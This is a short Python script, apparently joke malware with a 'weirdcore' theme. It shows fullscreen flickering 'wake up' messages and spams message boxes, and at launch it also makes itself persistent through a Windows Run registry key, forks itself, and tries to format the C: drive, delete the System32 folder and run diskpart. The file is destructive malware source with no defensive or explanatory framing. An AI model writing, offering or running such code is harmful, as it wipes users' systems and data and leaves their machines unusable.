import os
import subprocess
import sys
import time
import ctypes
import tkinter as tk
import random
import threading

def make_persistent():
    try:
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'MemoryMalware', '/t', 'REG_SZ', '/d', sys.executable + ' ' + __file__], check=True)
    except:
        pass

def fork_process():
    if os.name == 'nt':
        subprocess.Popen([sys.executable, __file__])
    else:
        os.fork()

def weirdcore_effect():
    root = tk.Tk()
    root.title("Memory Fragments")
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    def flicker_text():
        while True:
            phrases = [
                "Remember the old TV static... wake up",
                "Childhood toys in the dark... wake up",
                "Faded polaroids of faces you know... wake up",
                "Dreams of abandoned malls... wake up",
                "Whispers from forgotten games... wake up"
            ]
            text = random.choice(phrases)
            color = random.choice(['red', 'green', 'blue', 'yellow', 'purple'])
            label = tk.Label(root, text=text, fg=color, bg='black', font=('Courier', 24, 'bold'))
            label.pack()
            root.update()
            time.sleep(random.uniform(0.1, 1.0))
            label.destroy()
    
    threading.Thread(target=flicker_text, daemon=True).start()
    root.mainloop()

def spam_wake_up():
    while True:
        try:
            print("\033[31mWAKE UP\033[0m")
            sys.stdout.flush()
            ctypes.windll.user32.MessageBoxW(0, "WAKE UP", "Memory Intrusion", 1)
            with open("wake_up_log.txt", "a") as f:
                f.write("WAKE UP\n")
            time.sleep(0.5)
        except:
            pass

def brick_pc():
    try:
        subprocess.run(['format', 'C: /Q /FS:NTFS'], shell=True)
        subprocess.run(['rd', '/s', '/q', 'C:\\Windows\\System32'], shell=True)
        subprocess.run(['diskpart', '/s', 'script.txt'], shell=True)
    except:
        pass

if __name__ == "__main__":
    make_persistent()
    fork_process()
    threading.Thread(target=spam_wake_up, daemon=True).start()
    threading.Thread(target=brick_pc, daemon=True).start()
    weirdcore_effect()
    
    try:
        ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x40)
    except:
        pass
    
    while True:
        time.sleep(1)